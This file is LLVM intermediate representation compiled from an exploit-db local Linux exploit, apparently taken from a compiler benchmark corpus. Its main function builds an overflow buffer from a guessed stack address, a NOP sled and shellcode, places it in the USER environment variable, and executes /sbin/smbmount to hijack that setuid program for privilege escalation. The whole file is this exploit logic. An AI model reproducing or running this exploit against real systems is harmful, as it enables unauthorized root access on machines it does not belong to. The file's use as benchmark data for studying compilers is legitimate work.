; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19428.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19428.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@DEFAULT_ALIGNMENT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [33 x i8] c"bsize=%d offset=%d alignment=%d\0A\00", align 1
@.str.1 = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [21 x i8] c"Using address: 0x%x\0A\00", align 1
@NOP = common dso_local global i8 0, align 1
@shellcode = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [5 x i8] c"USER\00", align 1
@.str.4 = private unnamed_addr constant [15 x i8] c"/sbin/smbmount\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"smbmount\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"//a/a\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"./a\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"-Q\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %13, i32* %9, align 4
  %14 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %14, i32* %10, align 4
  %15 = load i32, i32* @DEFAULT_ALIGNMENT, align 4
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %3, align 4
  %17 = icmp sgt i32 %16, 1
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %4, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @atoi(i8* %21)
  store i32 %22, i32* %10, align 4
  br label %23

23:                                               ; preds = %18, %2
  %24 = load i32, i32* %3, align 4
  %25 = icmp sgt i32 %24, 2
  br i1 %25, label %26, label %31

26:                                               ; preds = %23
  %27 = load i8**, i8*** %4, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29)
  store i32 %30, i32* %9, align 4
  br label %31

31:                                               ; preds = %26, %23
  %32 = load i32, i32* %3, align 4
  %33 = icmp sgt i32 %32, 3
  br i1 %33, label %34, label %39

34:                                               ; preds = %31
  %35 = load i8**, i8*** %4, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 3
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %11, align 4
  br label %39

39:                                               ; preds = %34, %31
  %40 = load i32, i32* %10, align 4
  %41 = load i32, i32* %9, align 4
  %42 = load i32, i32* %11, align 4
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0), i32 %40, i32 %41, i32 %42)
  %44 = load i32, i32* %10, align 4
  %45 = call i8* @malloc(i32 %44)
  store i8* %45, i8** %5, align 8
  %46 = icmp ne i8* %45, null
  br i1 %46, label %50, label %47

47:                                               ; preds = %39
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %49 = call i32 @exit(i32 0) #3
  unreachable

50:                                               ; preds = %39
  %51 = call i32 (...) @get_sp()
  %52 = load i32, i32* %9, align 4
  %53 = sub nsw i32 %51, %52
  %54 = sext i32 %53 to i64
  store i64 %54, i64* %8, align 8
  %55 = load i32, i32* @stderr, align 4
  %56 = load i64, i64* %8, align 8
  %57 = call i32 @fprintf(i32 %55, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i64 %56)
  %58 = load i8*, i8** %5, align 8
  store i8* %58, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = load i32, i32* %11, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = bitcast i8* %62 to i64*
  store i64* %63, i64** %7, align 8
  store i32 0, i32* %12, align 4
  br label %64

64:                                               ; preds = %74, %50
  %65 = load i32, i32* %12, align 4
  %66 = load i32, i32* %10, align 4
  %67 = load i32, i32* %11, align 4
  %68 = sub nsw i32 %66, %67
  %69 = icmp slt i32 %65, %68
  br i1 %69, label %70, label %77

70:                                               ; preds = %64
  %71 = load i64, i64* %8, align 8
  %72 = load i64*, i64** %7, align 8
  %73 = getelementptr inbounds i64, i64* %72, i32 1
  store i64* %73, i64** %7, align 8
  store i64 %71, i64* %72, align 8
  br label %74

74:                                               ; preds = %70
  %75 = load i32, i32* %12, align 4
  %76 = add nsw i32 %75, 4
  store i32 %76, i32* %12, align 4
  br label %64

77:                                               ; preds = %64
  store i32 0, i32* %12, align 4
  br label %78

78:                                               ; preds = %89, %77
  %79 = load i32, i32* %12, align 4
  %80 = load i32, i32* %10, align 4
  %81 = sdiv i32 %80, 2
  %82 = icmp slt i32 %79, %81
  br i1 %82, label %83, label %92

83:                                               ; preds = %78
  %84 = load i8, i8* @NOP, align 1
  %85 = load i8*, i8** %5, align 8
  %86 = load i32, i32* %12, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  store i8 %84, i8* %88, align 1
  br label %89

89:                                               ; preds = %83
  %90 = load i32, i32* %12, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %12, align 4
  br label %78

92:                                               ; preds = %78
  %93 = load i8*, i8** %5, align 8
  %94 = load i32*, i32** @shellcode, align 8
  %95 = call i32 @strlen(i32* %94)
  %96 = sub nsw i32 128, %95
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %93, i64 %97
  store i8* %98, i8** %6, align 8
  store i32 0, i32* %12, align 4
  br label %99

99:                                               ; preds = %113, %92
  %100 = load i32, i32* %12, align 4
  %101 = load i32*, i32** @shellcode, align 8
  %102 = call i32 @strlen(i32* %101)
  %103 = icmp slt i32 %100, %102
  br i1 %103, label %104, label %116

104:                                              ; preds = %99
  %105 = load i32*, i32** @shellcode, align 8
  %106 = load i32, i32* %12, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %105, i64 %107
  %109 = load i32, i32* %108, align 4
  %110 = trunc i32 %109 to i8
  %111 = load i8*, i8** %6, align 8
  %112 = getelementptr inbounds i8, i8* %111, i32 1
  store i8* %112, i8** %6, align 8
  store i8 %110, i8* %111, align 1
  br label %113

113:                                              ; preds = %104
  %114 = load i32, i32* %12, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %12, align 4
  br label %99

116:                                              ; preds = %99
  %117 = load i8*, i8** %5, align 8
  %118 = load i32, i32* %10, align 4
  %119 = sub nsw i32 %118, 1
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %117, i64 %120
  store i8 0, i8* %121, align 1
  %122 = load i8*, i8** %5, align 8
  %123 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8* %122, i32 1)
  %124 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i32 0)
  ret void
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @fprintf(i32, i8*, i64) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
